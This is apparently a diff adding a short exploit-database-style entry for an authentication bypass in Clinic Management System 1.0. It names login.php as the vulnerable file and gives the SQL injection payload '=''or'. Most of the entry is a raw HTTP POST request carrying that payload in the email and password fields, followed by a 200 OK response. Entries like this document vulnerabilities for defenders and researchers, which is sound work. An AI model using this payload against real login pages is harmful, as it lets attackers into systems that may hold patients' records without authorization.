@@ -1,0 +1,42 @@
+# Exploit Title: Clinic Management System 1.0 - Authentication Bypass
+# Google Dork: N/A
+# Date: 2020-06-02
+# Exploit Author: BKpatron
+# Vendor Homepage: https://www.sourcecodester.com/php/14243/open-source-clinic-management-system-php-full-source-code.html
+# Software Link:  https://www.sourcecodester.com/sites/default/files/download/Nikhil_B/clinic-full-source-code-with-database_0.zip
+# Version: v1.0
+# Tested on: Win 10
+# CVE: N/A
+# my website: bkpatron.com
+
+# Vulnerability: Attacker can bypass login page and access to dashboard page
+# vulnerable file : login.php
+# Parameter & Payload: '=''or'
+# Proof of Concept:
+http://localhost/source%20code/login.php
+
+POST /source%20code/login.php HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 72
+Referer: http://localhost/source%20code/login.php
+Cookie: PHPSESSID=qdh5f7kelhhe9uvafveafit5e1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+user=admin&email=%27%3D%27%27or%27&password=%27%3D%27%27or%27&btn_login=: undefined
+
+HTTP/1.1 200 OK
+Date: Mon, 01 Jun 2020 19:52:17 GMT
+Server: Apache/2.4.39 (Win64) PHP/7.2.18
+X-Powered-By: PHP/7.2.18
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 4726
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
